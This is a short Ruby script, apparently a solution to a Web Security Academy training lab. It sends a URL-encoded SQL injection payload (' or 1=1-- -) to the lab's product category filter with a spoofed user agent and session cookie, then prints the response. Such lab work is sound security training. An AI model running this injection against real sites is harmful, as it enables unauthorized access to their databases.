require 'http'

payload = URI.encode_uri_component("' or 1=1-- -")

url = "https://0a1b00a203d6cd6e8141ed17006a0081.web-security-academy.net/filter?category=Gifts#{payload}"

client = HTTP.headers(
	"User-Agent"=>"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36"
	)
	.cookies(
		:session => "MKLKEyIa910QbecVESp1hmuHIpJ0U1A8"
	)

resp = client.get url
puts resp.body.to_s
